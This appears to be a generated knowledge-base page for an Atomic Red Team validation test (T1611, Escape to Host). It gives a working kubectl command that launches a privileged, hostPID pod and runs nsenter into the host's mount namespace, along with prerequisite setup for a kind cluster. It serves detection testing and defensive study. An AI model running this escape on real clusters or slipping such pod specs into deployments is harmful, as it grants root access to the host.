---
atomic_guid: "0b2f9520-a17a-4671-9dba-3bd034099fff"
title: "Deploy container using nsenter container escape"
framework: "atomic"
generated: "true"
attack_technique_id: "T1611"
attack_technique_name: "Escape to Host"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml"
build_date: "2026-04-26 14:38:40"
executor: "sh"
aliases:
  - "0b2f9520-a17a-4671-9dba-3bd034099fff"
  - "Deploy container using nsenter container escape"
platforms:
  - "containers"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Deploy container using nsenter container escape

In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.

Additional Details:
- https://twitter.com/mauilion/status/1129468485480751104
- https://securekubernetes.com/scenario_2_attack/

## Metadata

- Atomic GUID: 0b2f9520-a17a-4671-9dba-3bd034099fff
- Technique: T1611: Escape to Host
- Platforms: containers
- Executor: sh
- Dependency Executor: sh
- Source Path: atomics/T1611/T1611.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1611-escape_to_host|T1611]]

## Dependencies

Verify docker is installed.

### Prerequisite Check

```text
which docker
```

### Get Prerequisite

```text
if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
```

Verify docker service is running.

### Prerequisite Check

```text
sudo systemctl status docker
```

### Get Prerequisite

```text
sudo systemctl start docker
```

Verify kind is in the path.

### Prerequisite Check

```text
which kind
```

### Get Prerequisite

```text
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
chmod +x ./kind
mv kind /usr/bin/kind
```

Verify kind-atomic-cluster is created

### Prerequisite Check

```text
sudo kind get clusters
```

### Get Prerequisite

```text
sudo kind create cluster --name atomic-cluster
```

Verify kubectl is in path

### Prerequisite Check

```text
which kubectl
```

### Get Prerequisite

```text
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x ./kubectl
mv kubectl /usr/bin/kubectl
```

## Executor

- name: sh

### Command

```sh
kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

### Cleanup

```sh
kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml)
